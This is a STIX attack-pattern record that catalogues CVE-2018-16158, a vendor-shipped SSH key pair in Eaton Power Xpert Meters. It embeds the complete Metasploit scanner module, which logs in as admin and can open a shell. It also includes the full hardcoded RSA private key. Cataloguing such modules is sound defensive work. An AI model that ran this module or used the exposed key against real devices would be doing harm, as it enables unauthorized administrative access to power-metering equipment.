{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--0859a4de-27ac-42f2-a078-c79cb5f8b3ae",
    "created": "2024-08-14T16:27:30.966124Z",
    "modified": "2024-08-14T16:27:30.966128Z",
    "name": "Eaton Xpert Meter SSH Private Key Exposure Scanner",
    "description": " Eaton Power Xpert Meters running firmware below version 12.x.x.x or below version 13.3.x.x ship with a public/private key pair that facilitate remote administrative access to the devices. Tested on: Firmware 12.1.9.1 and 13.3.2.10. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/ssh/eaton_xpert_backdoor.rb",
            "external_id": "eaton_xpert_backdoor.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2018-16158"
        },
        {
            "source_name": "reference",
            "url": "https://www.eaton.com/content/dam/eaton/company/news-insights/cybersecurity/security-bulletins/PXM-Advisory.pdf"
        },
        {
            "source_name": "reference",
            "url": "https://www.ctrlu.net/vuln/0006.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n###\n\n# XXX: This shouldn't be necessary but is now\nrequire 'net/ssh'\nrequire 'net/ssh/command_stream'\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::SSH\n  include Msf::Auxiliary::Scanner\n  include Msf::Auxiliary::CommandShell\n  include Msf::Auxiliary::Report\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Eaton Xpert Meter SSH Private Key Exposure Scanner',\n      'Description'    => %q{\n        Eaton Power Xpert Meters running firmware below version 12.x.x.x or\n        below version 13.3.x.x ship with a public/private key pair that\n        facilitate remote administrative access to the devices.\n        Tested on: Firmware 12.1.9.1 and 13.3.2.10.\n      },\n      'Author'         => [\n        'BrianWGray'\n      ],\n      'References'     => [\n        ['CVE', '2018-16158'],\n        ['EDB', '45283'],\n        ['URL', 'https://www.eaton.com/content/dam/eaton/company/news-insights/cybersecurity/security-bulletins/PXM-Advisory.pdf'],\n        ['URL', 'https://www.ctrlu.net/vuln/0006.html']\n      ],\n      'DisclosureDate' => '2018-07-18',\n      'License'        => MSF_LICENSE\n    ))\n\n    register_options([\n      Opt::RPORT(22)\n    ])\n\n    register_advanced_options([\n      OptBool.new('SSH_DEBUG',  [false, 'SSH debugging', false]),\n      OptInt.new('SSH_TIMEOUT', [false, 'SSH timeout', 10])\n    ])\n  end\n\n  def run_host(ip)\n\n    # Specified Kex/Encryption downgrade requirements must be set to connect to the Power Meters.\n    ssh_opts = ssh_client_defaults.merge({\n      auth_methods:    ['publickey'],\n      port:            rport,\n      key_data:        [ key_data ],\n      hmac:            ['hmac-sha1'],\n      encryption:      ['aes128-cbc'],\n      kex:             ['diffie-hellman-group1-sha1'],\n      host_key:        ['ssh-rsa']\n    })\n\n    ssh_opts.merge!(verbose: :debug) if datastore['SSH_DEBUG']\n\n    begin\n      ssh = Timeout.timeout(datastore['SSH_TIMEOUT']) do\n        Net::SSH.start(ip, 'admin', ssh_opts)\n      end\n    rescue Net::SSH::Exception => e\n      vprint_error(\"#{ip}:#{rport} - #{e.class}: #{e.message}\")\n      return\n    end\n\n    return unless ssh\n\n    print_good(\"#{ip}:#{rport} - Logged in as admin\")\n\n    version = ssh.transport.server_version.version\n\n    report_vuln(\n      host: ip,\n      name: self.name,\n      refs: self.references,\n      info: version\n    )\n\n    shell = Net::SSH::CommandStream.new(ssh)\n\n    # XXX: Wait for CommandStream to log a channel request failure\n    sleep 0.1\n\n    if (e = shell.error)\n      print_error(\"#{ip}:#{rport} - #{e.class}: #{e.message}\")\n      return\n    end\n\n    info = \"#{self.name} (#{version})\"\n\n    ds_merge = {\n      'USERNAME' => 'admin'\n    }\n\n    if datastore['CreateSession']\n      start_session(self, info, ds_merge, false, shell.lsock)\n    end\n\n    # XXX: Ruby segfaults if we don't remove the SSH socket\n    remove_socket(ssh.transport.socket)\n  end\n\n  def rport\n    datastore['RPORT']\n  end\n\n  def key_data\n    <<EOF\n-----BEGIN RSA PRIVATE KEY-----\nMIICWwIBAAKBgQCfwugh3Y3mLbxw0q4RZZ5rfK3Qj8t1P81E6sXjhZl7C3FyH4Mj\nC15CEzWovoQpRKrPdDaB5fVyuk6w2fKHrvHLmU2jTzq79B7A4JJEBQatAJeoVDgl\nTyfL+q6BYAtAeNsho8eP/fMwrT2vhylNJ4BTsJbmdDJMoaaHu/0IB9Z9ywIBIwKB\ngQCEX6plM+qaJeVHif3xKFAP6vZq+s0mopQjKO0bmpUczveZEsu983n8O81f7lA/\nc2j1CITvSYI6fRyhKZ0RVnCRcaQ8h/grzZNdyyD3FcqDNKO7Xf+bvYySrQXhLeQP\nI3jXGQPfBZUicGPcJclA98SBdBI1SReAUls1ZdzDwA3T8wJBAM6j1N3tYhdqal2W\ngA1/WSQrFxTt28mFeUC8enGvKLRm1Nnxk/np9qy2L58BvZzCGyHAsZyVZ7Sqtfb3\nYzqKMzUCQQDF7GrnrxNXWsIAli/UZscqIovN2ABRa2y8/JYPQAV/KRQ44vet2aaB\ntrQBK9czk0QLlBfXrKsofBW81+Swiwz/AkEAh8q/FX68zY8Ssod4uGmg+oK3ZYZd\nO0kVKop8WVXY65QIN3LdlZm/W42qQ+szdaQgdUQc8d6F+mGNhQj4EIaz7wJAYCJf\nz54t9zq2AEjyqP64gi4JY/szWr8mL+hmJKoRTGRo6G49yXhYMGAOSbY1U5CsBZ+z\nzyf7XM6ONycIrYVeFQJABB8eqx/R/6Zwi8mVKMAF8lZXZB2dB+UOU12OGgvAHCKh\n7izYQtGEgPDbklbvEZ31F7H2o337V6FkXQMFyQQdHA==\n-----END RSA PRIVATE KEY-----\nEOF\n  end\nend\n",
    "x_mitre_disclosure_date": "2018-07-18"
}